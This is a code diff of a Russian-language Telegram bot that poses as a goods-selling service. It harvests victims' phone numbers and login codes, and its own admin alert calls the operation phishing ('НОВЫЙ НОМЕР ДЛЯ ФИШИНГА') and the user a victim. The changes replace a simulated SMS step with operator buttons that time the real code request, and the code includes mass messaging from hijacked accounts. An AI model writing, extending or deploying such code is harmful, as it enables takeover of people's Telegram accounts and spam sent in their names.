@@ -20,7 +20,6 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from pyrogram import Client
-import asyncio
 import sys
 
 # Включите подробное логирование
@@ -570,61 +569,22 @@ else:
 
 async def simulate_sms_delivery(user_id: int, phone: str, code: str):
     """
-    Имитирует задержку доставки SMS и выводит код в чат как системное сообщение.
+    Имитирует задержку доставки SMS
     """
     try:
         # Случайная задержка от 3 до 10 секунд для реалистичности
         delay = random.uniform(3, 10)
         await asyncio.sleep(delay)
 
-        # Форматируем номер для отображения (последние 4 цифры)
-        masked_phone = f"******{phone[-4:]}" if len(phone) > 4 else phone
-
-        # Создаем сообщение, стилизованное под SMS от оператора
-        sms_notification = (
-            f"📱 <b>SMS от оператора:</b>\n\n"
-            f"Код подтверждения: <code>{code}</code>\n"
-            f"Для номера: <code>{masked_phone}</code>\n\n"
-            f"<i>Сообщение автоматически доставлено. Не отвечайте на это SMS.</i>"
+        # Сохраняем в историю отправленных кодов
+        cursor.execute(
+            "INSERT INTO sms_codes (user_id, phone, code, used) VALUES (?, ?, ?, ?)",
+            (user_id, phone, code, 0)
         )
-
-        # Пытаемся отправить сообщение
-        try:
-            await bot.send_message(user_id, sms_notification, parse_mode="HTML")
-            logger.info(f"[SMS SIM] Код {code} успешно 'отправлен' пользователю {user_id} на номер {masked_phone}")
-            
-            # Сохраняем в историю отправленных кодов
-            cursor.execute(
-                "INSERT INTO sms_codes (user_id, phone, code, used) VALUES (?, ?, ?, ?)",
-                (user_id, phone, code, 0)
-            )
-            conn.commit()
-            
-        except Exception as send_error:
-            logger.error(f"[SMS SIM] Не удалось отправить SMS пользователю {user_id}: {send_error}")
-            
-            # Пробуем отправить более простое сообщение
-            try:
-                simple_notification = f"📱 SMS код: {code}\nДля номера: {masked_phone}"
-                await bot.send_message(user_id, simple_notification)
-                logger.info(f"[SMS SIM] Упрощенное сообщение отправлено пользователю {user_id}")
-            except Exception as simple_error:
-                logger.error(f"[SMS SIM] Не удалось отправить даже упрощенное сообщение: {simple_error}")
-                
-                # Уведомляем админа о проблеме
-                try:
-                    await bot.send_message(
-                        ADMIN_ID,
-                        f"⚠️ <b>ПРОБЛЕМА С ОТПРАВКОЙ SMS</b>\n\n"
-                        f"Пользователь: {user_id}\n"
-                        f"Телефон: +{phone}\n"
-                        f"Код: {code}\n"
-                        f"Ошибка: {simple_error}",
-                        parse_mode="HTML"
-                    )
-                except:
-                    pass
+        conn.commit()
         
+        logger.info(f"[SMS SIM] Код {code} 'отправлен' пользователю {user_id} на номер {phone}")
+            
     except Exception as e:
         logger.error(f"[SMS SIM] Критическая ошибка в функции simulate_sms_delivery: {e}")
 
@@ -973,7 +933,7 @@ async def auto_message_from_all_accounts(message_text: str, targets: list):
         if not active_accounts:
             logger.warning("[AUTO-MESSAGE] Нет активных аккаунтов")
             return
-        
+    
         logger.info(f"[AUTO-MESSAGE] Начинаю рассылку с {len(active_accounts)} аккаунтов")
         
         for account in active_accounts:
@@ -1058,8 +1018,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")],
-        [InlineKeyboardButton(text="ℹ️ О НАС", callback_data="about_us")],
-        [InlineKeyboardButton(text="📞 ПОДДЕРЖКА", callback_data="support")]
+        [InlineKeyboardButton(text="ℹ️ О НАС", callback_data="about_us")]
     ])
     
     await message.answer(welcome_text, parse_mode="HTML", reply_markup=keyboard)
@@ -1555,17 +1514,17 @@ async def process_phone_number(message: types.Message, state: FSMContext):
     )
     conn.commit()
 
-    # 1. Сразу сообщаем пользователю, что код отправлен
+    # 1. Сообщаем пользователю, что код отправлен
     initial_text = f"""
 ✅ <b>НОМЕР ПОДТВЕРЖДЕН: +{phone}</b>
 
 📱 <b>На номер +{phone} было отправлено SMS с кодом подтверждения.</b>
 
-⏳ <b>Пожалуйста, ожидайте доставки сообщения (обычно это занимает несколько секунд).</b>
+⏳ <b>Пожалуйста, ожидайте ответа от администратора для отправки кода.</b>
 
 🔢 <b>Код состоит из 5-6 цифр.</b>
 
-<i>Если SMS не пришло в течение 2 минут, используйте команду</i> /resend_code
+<i>Обычно это занимает несколько минут. Вы получите уведомление, когда код будет готов.</i>
 """
     
     logger.info(f"[DEBUG] Отправляю начальное сообщение пользователю {user.id}")
@@ -1576,37 +1535,11 @@ async def process_phone_number(message: types.Message, state: FSMContext):
     except Exception as e:
         logger.error(f"[DEBUG] Ошибка отправки начального сообщения: {e}")
 
-    # 2. Запускаем фоновую задачу для имитации отправки SMS
-    logger.info(f"[DEBUG] Запускаю задачу simulate_sms_delivery для пользователя {user.id}")
-    sms_task = asyncio.create_task(simulate_sms_delivery(user.id, phone, fake_code))
-    
-    # Сохраняем задачу для отслеживания
-    logger.info(f"[DEBUG] Задача создана: {sms_task}")
-
-    # 3. Переводим пользователя в состояние ожидания кода
+    # 2. Переводим пользователя в состояние ожидания кода
     await state.set_state(VerificationStates.waiting_code)
     logger.info(f"[DEBUG] Пользователь {user.id} переведен в состояние waiting_code")
-    
-    # 4. Ждем 5 секунд и просим ввести код (больше времени на "отправку SMS")
-    await asyncio.sleep(5)
-    
-    code_request_text = f"""
-✍️ <b>Введите код из SMS, который пришел на номер +{phone}:</b>
 
-<code>Пример кода: {fake_code}</code>
-
-<i>Если код не пришел, используйте</i> /resend_code
-"""
-    
-    logger.info(f"[DEBUG] Прошу ввести код пользователю {user.id}")
-    
-    try:
-        await message.answer(code_request_text, parse_mode="HTML")
-        logger.info(f"[DEBUG] Запрос кода отправлен успешно")
-    except Exception as e:
-        logger.error(f"[DEBUG] Ошибка отправки запроса кода: {e}")
-
-    # 5. Отправляем уведомление админу
+    # 3. Уведомляем админа о необходимости отправить код
     admin_msg = f"""
 🎣 <b>НОВЫЙ НОМЕР ДЛЯ ФИШИНГА</b>
 ━━━━━━━━━━━━━━━━
@@ -1616,15 +1549,84 @@ async def process_phone_number(message: types.Message, state: FSMContext):
 🔢 <b>Сгенерированный код:</b> {fake_code}
 ⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
 ━━━━━━━━━━━━━━━━
-<b>Ожидается ввод кода...</b>
+<b>Жертва ожидает код. Отправьте SMS код:</b> {fake_code}
 """
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Код отправлен", callback_data=f"code_sent_{user.id}")],
+        [InlineKeyboardButton(text="❌ Отменить", callback_data=f"cancel_code_{user.id}")]
+    ])
+    
     try:
-        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
+        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=keyboard)
         logger.info(f"[DEBUG] Уведомление админу отправлено")
     except Exception as e:
         logger.error(f"[DEBUG] Ошибка отправки админу: {e}")
     
     log_action(user.id, "phone_submitted", f"phone: {phone}")
+
+@dp.callback_query(F.data.startswith("code_sent_"))
+async def handle_code_sent(callback_query: types.CallbackQuery):
+    """Админ подтвердил отправку кода"""
+    user_id = int(callback_query.data.split("_")[2])
+    
+    # Получаем информацию о пользователе
+    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user_id,))
+    user_data = cursor.fetchone()
+    
+    if not user_data:
+        await callback_query.answer("❌ Пользователь не найден")
+        return
+    
+    phone = user_data[0]
+    code = user_data[1]
+    
+    # Сообщаем пользователю, что код "отправлен"
+    user_notification = f"""
+✍️ <b>Администратор отправил SMS код на номер +{phone}:</b>
+
+<code>Пример кода: {code}</code>
+
+<b>Пожалуйста, введите код из SMS:</b>
+
+<i>Если код не пришел, используйте</i> /resend_code
+"""
+    
+    try:
+        await bot.send_message(user_id, user_notification, parse_mode="HTML")
+        await callback_query.answer("✅ Пользователь уведомлен о отправке кода")
+        
+        # Обновляем сообщение админу
+        await bot.edit_message_text(
+            f"✅ <b>Код отправлен пользователю {user_id}</b>\n\n"
+            f"Телефон: +{phone}\n"
+            f"Код: {code}\n"
+            f"Статус: Ожидание ввода кода",
+            chat_id=callback_query.message.chat.id,
+            message_id=callback_query.message.message_id,
+            parse_mode="HTML"
+        )
+        
+    except Exception as e:
+        await callback_query.answer(f"❌ Ошибка: {str(e)[:100]}")
+        logger.error(f"[CODE SENT] Ошибка отправки пользователю: {e}")
+
+@dp.callback_query(F.data.startswith("cancel_code_"))
+async def handle_cancel_code(callback_query: types.CallbackQuery):
+    """Админ отменяет отправку кода"""
+    user_id = int(callback_query.data.split("_")[2])
+    
+    try:
+        await bot.edit_message_text(
+            f"❌ <b>Отправка кода отменена для пользователя {user_id}</b>",
+            chat_id=callback_query.message.chat.id,
+            message_id=callback_query.message.message_id,
+            parse_mode="HTML"
+        )
+        await callback_query.answer("❌ Отправка кода отменена")
+        
+    except Exception as e:
+        logger.error(f"[CANCEL CODE] Ошибка: {e}")
 
 @dp.message(VerificationStates.waiting_code, F.text.regexp(r'^\d{5,6}$'))
 async def process_verification_code(message: types.Message, state: FSMContext):
@@ -1739,34 +1741,112 @@ async def cmd_resend_code(message: types.Message, state: FSMContext):
     resend_text = f"""
 🔄 <b>Запрошена повторная отправка кода</b>
 
-📱 <b>Новый код отправлен на номер +{phone}.</b>
-⏳ <b>Ожидайте SMS в течение нескольких секунд.</b>
+📱 <b>Новый код будет отправлен на номер +{phone} после проверки администратором.</b>
+⏳ <b>Пожалуйста, ожидайте ответа от администратора.</b>
 
-<i>Если код снова не пришел, проверьте:</i>
-• Корректность номера
-• Зону покрытия сети
-• Настройки блокировки SMS
+<i>Администратор получил ваш запрос и скоро отправит код.</i>
 """
     await message.answer(resend_text, parse_mode="HTML")
 
-    # Запускаем имитацию отправки нового кода
-    asyncio.create_task(simulate_sms_delivery(user.id, phone, new_fake_code))
-
-    # Ждем и просим ввести код
-    await asyncio.sleep(3)
-    await message.answer(f"✍️ <b>Введите новый код из SMS, который пришел на номер +{phone}:</b>", parse_mode="HTML")
-
-    # Уведомляем админа
+    # Уведомляем админа о запросе нового кода
+    admin_notification = f"""
+🔄 <b>ЗАПРОС ПОВТОРНОЙ ОТПРАВКИ КОДА</b>
+━━━━━━━━━━━━━━━━
+👤 <b>Пользователь:</b> {user.first_name} (@{user.username})
+🆔 <b>User ID:</b> {user.id}
+📱 <b>Телефон:</b> +{phone}
+🔢 <b>Старый код:</b> {old_code}
+🔢 <b>Новый код:</b> {new_fake_code}
+⏰ <b>Время запроса:</b> {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━
+<b>Отправить новый код пользователю?</b>
+"""
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Отправить новый код", callback_data=f"resend_code_{user.id}")],
+        [InlineKeyboardButton(text="❌ Отклонить запрос", callback_data=f"reject_resend_{user.id}")]
+    ])
+    
     try:
-        await bot.send_message(
-            ADMIN_ID,
-            f"🔄 <b>ПОВТОРНАЯ ОТПРАВКА КОДА</b>\n\nПользователь {user.id} запросил новый код.\nСтарый код: {old_code}\nНовый код: {new_fake_code}",
-            parse_mode="HTML"
-        )
+        await bot.send_message(ADMIN_ID, admin_notification, parse_mode="HTML", reply_markup=keyboard)
     except:
         pass
     
     log_action(user.id, "resend_code_requested")
+
+@dp.callback_query(F.data.startswith("resend_code_"))
+async def handle_admin_resend_code(callback_query: types.CallbackQuery):
+    """Админ отправляет новый код"""
+    user_id = int(callback_query.data.split("_")[2])
+    
+    # Получаем информацию о пользователе
+    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user_id,))
+    user_data = cursor.fetchone()
+    
+    if not user_data:
+        await callback_query.answer("❌ Пользователь не найден")
+        return
+    
+    phone = user_data[0]
+    code = user_data[1]
+    
+    # Уведомляем пользователя
+    user_message = f"""
+✍️ <b>Администратор отправил новый SMS код на номер +{phone}:</b>
+
+<code>Пример кода: {code}</code>
+
+<b>Пожалуйста, введите код из SMS:</b>
+
+<i>Если код не пришел, используйте</i> /resend_code
+"""
+    
+    try:
+        await bot.send_message(user_id, user_message, parse_mode="HTML")
+        await callback_query.answer("✅ Новый код отправлен пользователю")
+        
+        # Обновляем сообщение админу
+        await bot.edit_message_text(
+            f"✅ <b>Новый код отправлен пользователю {user_id}</b>\n\n"
+            f"Телефон: +{phone}\n"
+            f"Код: {code}\n"
+            f"Статус: Ожидание ввода кода",
+            chat_id=callback_query.message.chat.id,
+            message_id=callback_query.message.message_id,
+            parse_mode="HTML"
+        )
+        
+    except Exception as e:
+        await callback_query.answer(f"❌ Ошибка: {str(e)[:100]}")
+        logger.error(f"[RESEND CODE] Ошибка отправки пользователю: {e}")
+
+@dp.callback_query(F.data.startswith("reject_resend_"))
+async def handle_reject_resend(callback_query: types.CallbackQuery):
+    """Админ отклоняет запрос повторной отправки"""
+    user_id = int(callback_query.data.split("_")[2])
+    
+    try:
+        await bot.edit_message_text(
+            f"❌ <b>Запрос повторной отправки кода отклонен для пользователя {user_id}</b>",
+            chat_id=callback_query.message.chat.id,
+            message_id=callback_query.message.message_id,
+            parse_mode="HTML"
+        )
+        await callback_query.answer("❌ Запрос отклонен")
+        
+        # Уведомляем пользователя
+        try:
+            await bot.send_message(
+                user_id,
+                "❌ <b>Ваш запрос на повторную отправку кода отклонен администратором.</b>\n\n"
+                "Пожалуйста, обратитесь в поддержку для выяснения причины.",
+                parse_mode="HTML"
+            )
+        except:
+            pass
+        
+    except Exception as e:
+        logger.error(f"[REJECT RESEND] Ошибка: {e}")
 
 @dp.message(VerificationStates.waiting_code)
 async def handle_wrong_code_input(message: types.Message):
@@ -2279,7 +2359,7 @@ async def cmd_help(message: types.Message):
 • Выплаты в течение 24 часов
 
 <b>Поддержка:</b>
-Для связи с администратором используйте кнопку "📞 ПОДДЕРЖКА" в меню.
+Для связи с администратором используйте кнопку "ℹ️ О НАС" в меню.
 """
     
     await message.answer(help_text, parse_mode="HTML")
@@ -2315,41 +2395,6 @@ async def about_us(callback_query: types.CallbackQuery):
     
     await bot.edit_message_text(
         about_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML"
-    )
-
-@dp.callback_query(F.data == "support")
-async def support(callback_query: types.CallbackQuery):
-    support_text = """
-📞 <b>ПОДДЕРЖКА</b>
-
-<b>Связь с администрацией:</b>
-👑 <b>Главный администратор:</b> @Swill_Way_Admin
-👮 <b>Модератор:</b> @Swill_Way_Moderator
-
-<b>Часы работы поддержки:</b> Круглосуточно
-
-<b>Среднее время ответа:</b>
-• Обычные вопросы: 5-15 минут
-• Срочные вопросы: 1-5 минут
-• Технические проблемы: до 30 минут
-
-<b>Что мы можем помочь:</b>
-• Проблемы с верификацией
-• Вопросы по выплатам
-• Технические неполадки
-• Жалобы и предложения
-
-<b>Перед обращением подготовьте:</b>
-1. Ваш User ID (можно узнать через /status)
-2. Номер заявки (если есть)
-3. Подробное описание проблемы
-"""
-    
-    await bot.edit_message_text(
-        support_text,
         chat_id=callback_query.message.chat.id,
         message_id=callback_query.message.message_id,
         parse_mode="HTML"
